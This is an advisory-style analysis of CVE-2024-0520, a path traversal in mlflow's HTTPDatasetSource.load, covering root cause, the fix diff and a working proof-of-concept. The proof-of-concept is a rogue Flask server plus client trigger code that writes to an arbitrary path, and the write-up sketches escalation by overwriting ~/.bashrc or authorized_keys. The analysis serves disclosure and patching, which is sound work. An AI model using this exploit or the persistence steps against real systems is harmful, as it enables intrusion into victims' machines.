1. Detailed Summary  
   - Vulnerability ID: CVE-2024-0520  
   - Affected Software: mlflow (Python package)  
   - Affected Version: 2.8.1  
   - Vulnerability Type: CWE-23 (Relative Path Traversal) leading to arbitrary file write and ultimately remote code execution  
   - Severity: Critical (CVSS 10.0)  
   - Description:  
     The `HTTPDatasetSource.load` method in `mlflow.data.http_dataset_source.py` fetches a remote dataset over HTTP and determines the local filename by inspecting either:  
       a) the `filename` parameter in the HTTP `Content-Disposition` header, or  
       b) the basename of the URL path.  
     In both cases, the code does not validate or sanitize the extracted filename. An attacker who controls the remote server can return a `Content-Disposition: attachment; filename="../../tmp/poc.txt"` (or an absolute path like `"/tmp/poc.txt"`) and cause the MLflow client to write the downloaded contents to an arbitrary location on disk. Once arbitrary file write is achieved, a malicious actor can overwrite startup scripts (e.g., `~/.bashrc`) or other sensitive files to achieve remote code execution on the victim system.  

2. Root Cause Analysis  
   In `mlflow/data/http_dataset_source.py`, the relevant code is:  
   ```python
   def load(self, dst_path=None) -> str:
       resp = cloud_storage_http_request(
           method="GET", url=self.url, stream=True,
       )
       augmented_raise_for_status(resp)

       path = urlparse(self.url).path
       content_disposition = resp.headers.get("Content-Disposition")
       if content_disposition is not None and (
           file_name := next(re.finditer(r"filename=(.+)", content_disposition), None)
       ):
           # NO SANITIZATION HERE
           basename = file_name[1].strip("'\"")
       elif path is not None and len(posixpath.basename(path)) > 0:
           basename = posixpath.basename(path)
       else:
           basename = "dataset_source"

       if dst_path is None:
           dst_path = create_tmp_dir()

       dst_path = os.path.join(dst_path, basename)
       with open(dst_path, "wb") as f:
           # write file…
   ```
   - The extracted `basename` can contain directory separators (`../`, `/`) because there is no check against path traversal or absolute paths.  
   - `os.path.join(dst_path, basename)` will honor any leading slash (absolute path) or `..` components, allowing writes outside the intended temporary directory.  
   - An attacker fully controls the file path on the victim’s filesystem, enabling arbitrary file write and, with additional steps (e.g., overwriting a shell startup file), remote code execution.  

   The fix adds a helper function `_is_path(filename)` that rejects any filename containing separators, i.e., where `os.path.basename(filename) != filename`. If a path is detected, an exception is raised instead of writing the file:

   ```diff
   +import os
   +
   +def _is_path(filename: str) -> bool:
   +    """
   +    Return True if `filename` is a path (contains separators), False otherwise.
   +    """
   +    return os.path.basename(filename) != filename
   +
   class HTTPDatasetSource(DatasetSource):
       # ...
       def load(self, dst_path=None) -> str:
           # ...
           if content_disposition is not None and (
               file_name := next(re.finditer(r"filename=(.+)", content_disposition), None)
           ):
               basename = file_name[1].strip("'\"")
   +           if _is_path(basename):
   +               raise MlflowException.invalid_parameter_value(
   +                   f"Invalid filename in Content-Disposition header: {basename}. "
   +                   "It must be a file name, not a path."
   +               )
           elif path is not None and len(posixpath.basename(path)) > 0:
               basename = posixpath.basename(path)
           else:
               basename = "dataset_source"
           # ...
   ```

3. Exploitation Steps and Proof-of-Concept  
   The advisory did not provide a fully fleshed-out RCE chain, but demonstrated arbitrary file write. From that, it’s trivial to escalate to code execution. Below is a step-by-step PoC for full controlled file write, followed by an outline for RCE.

   a) Rogue HTTP server (writes a CSV and sets a malicious Content-Disposition header):

   ```python
   # rogue_server.py
   from flask import Flask, Response

   app = Flask(__name__)

   @app.route("/")
   def index():
       # Sample CSV content
       csv_data = """
   "fixed acidity";"volatile acidity";"citric acid";"residual sugar";"chlorides";"free sulfur dioxide";"total sulfur dioxide";"density";"pH";"sulphates";"alcohol";"quality"
   7.4;0.7;0;1.9;0.076;11;34;0.9978;3.51;0.56;9.4;5
   7.8;0.88;0;2.6;0.098;25;67;0.9968;3.2;0.68;9.8;5
       """
       res = Response(csv_data)
       # Malicious filename => writes to /tmp/poc.txt on victim
       res.headers["Content-Disposition"] = 'attachment; filename="/tmp/poc.txt"'
       return res

   if __name__ == "__main__":
       app.run("0.0.0.0", 4444)
   ```

   b) Client code to trigger file write via MLflow:

   ```python
   # trigger_write.py
   import mlflow.data
   import pandas as pd
   from mlflow.data.pandas_dataset import PandasDataset

   # 1) Read the dataset into a pandas DataFrame
   df = pd.read_csv("http://localhost:4444")

   # 2) Create an MLflow dataset pointing at the same URL
   dataset: PandasDataset = mlflow.data.from_pandas(df, source="http://localhost:4444")

   with mlflow.start_run():
       mlflow.log_input(dataset, context="training")

   # 3) Retrieve the run and re-load the source, which invokes HTTPDatasetSource.load()
   run = mlflow.get_run(mlflow.last_active_run().info.run_id)
   dataset_info = run.inputs.dataset_inputs[0].dataset
   dataset_source = mlflow.data.get_source(dataset_info)

   # 4) This call writes /tmp/poc.txt on disk
   dataset_source.load()
   print("If /tmp/poc.txt was created, arbitrary file write succeeded")
   ```

   After step (4), you should see `/tmp/poc.txt` on disk with the CSV contents.  

   c) Escalation to Remote Code Execution  
   - Overwrite a user‐writable startup script, for example:  
     - Set `Content-Disposition: attachment; filename="$HOME/.bashrc"` and return malicious shell commands.  
     - After the victim logs out and back in (or spawns a new shell), the malicious commands execute.  
   - Alternatively, overwrite `~/.ssh/authorized_keys` to plant a backdoor.

   By combining full controlled file write with common persistence or startup mechanisms, an attacker achieves remote code execution on the victim host.  

References:  
- Security Advisory: https://huntr.com/bounties/93e470d7-b6f0-409b-af63-49d3e2a26dbc  
- Fix Commit: https://github.com/mlflow/mlflow/pull/10584 (commit 400c226953b4568f4361bc0a0c223511652c2b9d)  
- CWE-23: https://cwe.mitre.org/data/definitions/23.html